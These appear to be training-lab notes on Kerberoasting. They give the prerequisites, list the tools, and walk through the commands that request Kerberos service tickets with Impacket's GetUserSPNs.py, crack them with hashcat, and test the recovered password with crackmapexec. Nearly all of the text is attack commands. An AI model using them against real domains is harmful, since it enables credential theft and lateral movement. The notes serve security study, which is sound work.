Lateral movement / privilege escalation technique that utilizes Service Principal Names (SPNs)

Service tickets (TGS) to access service within domain.
If you gain TGS ticket, you still need to crack it offline.

What you need:
- Cleartext password (or NTLM hash)
- a shell in the contxt of a domain user account
- SYSTEM level access on a domain-joined host

Can be performed:
- From a non-domain joined Linux host using valid domain user credentials
- From a domain-joined Linux host as root after retrieving the keytab file
- From a domain-joined Windows host authenticated as a domain user
- From a domain-joined Windows host with a shell in the context of a domain account
- As SYSTEM on a domain-joined host
- From a non-domain joined Windows host using runas /netonly

Tools:
- Impacket's GetUserSPNs.py from a non-domain joined Linux host
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz
- From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts

## Installing Impacket using Pip
```shell-session
sudo python3 -m pip install .
GetUserSPNs.py -h
```

**Listing SPN Accounts with GetUserSPNs.py
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

**Requesting all TGS Tickets
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

**Requesting a Single TGS ticket
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

**Saving the TGS Ticket to an Output File to crack offline with hashcat
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

**Cracking the Ticket Offline with Hashcat
```shell-session
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

**Testing Authentication against a Domain Controller
```shell-session
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```
